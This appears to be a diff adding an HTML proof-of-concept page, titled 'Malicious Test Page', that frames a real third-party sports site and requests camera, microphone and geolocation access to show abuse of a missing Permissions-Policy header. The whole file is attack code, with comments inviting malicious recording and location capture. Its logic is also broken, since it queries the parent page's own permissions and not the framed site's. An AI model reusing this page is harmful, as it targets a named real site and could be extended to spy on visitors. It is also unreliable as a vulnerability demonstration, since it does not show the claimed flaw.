@@ -1,0 +1,45 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Malicious Test Page</title>
+</head>
+<body>
+  <h1>Welcome to Test Page</h1>
+  <p>This page demonstrates abuse of missing Permissions-Policy header.</p>
+
+  <!-- Embed the victim's website in an iframe -->
+  <iframe src="https://fans.sports.qq.com/" id="victimFrame" allow="camera; microphone; geolocation"></iframe>
+
+  <script>
+    // Wait for the iframe to load
+    const iframe = document.getElementById('victimFrame');
+    iframe.onload = () => {
+      try {
+        // Attempt to access sensitive features through the iframe
+        navigator.mediaDevices.getUserMedia({ video: true, audio: true })
+          .then((stream) => {
+            console.log('Successfully accessed camera and microphone!');
+            // Do something malicious with the stream, e.g., record audio/video
+          })
+          .catch((error) => {
+            console.error('Failed to access camera/microphone:', error.message);
+          });
+
+        // Attempt to access geolocation
+        navigator.geolocation.getCurrentPosition(
+          (position) => {
+            console.log('Successfully accessed geolocation:', position.coords);
+            // Do something malicious with the geolocation data
+          },
+          (error) => {
+            console.error('Failed to access geolocation:', error.message);
+          }
+        );
+      } catch (e) {
+        console.error('Error accessing features:', e.message);
+      }
+    };
+  </script>
+</body>
+</html>
